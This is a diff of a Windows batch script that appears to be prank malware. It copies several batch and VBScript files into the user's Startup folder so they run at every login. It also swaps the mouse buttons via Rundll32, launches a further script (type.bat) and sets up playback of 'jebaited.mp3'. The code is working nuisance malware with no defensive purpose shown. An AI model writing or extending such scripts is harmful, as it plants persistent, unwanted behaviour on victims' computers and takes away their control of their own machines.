@@ -1,8 +1,6 @@
 @echo off
 cls
 
-ping localhost -n 6 >NUL
-Rundll32 user32, SwapMouseButton
 
 copy startup.bat "%userprofile%\STARTM~1\Programs\Startup"
 
@@ -32,8 +30,12 @@ copy run.vbs "%userprofile%\Start Menu\Programs\Startup"
 
 copy UnrealV4.bat "%userprofile%\Start Menu\Programs\Startup"
 
+ping localhost -n 6 >NUL
+Rundll32 user32, SwapMouseButton
 
-ping localhost -n 15 >NUL
+start type.bat
+ping localhost -n 30 >NUL
+
 
 set "file=jebaited.mp3"
 ( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
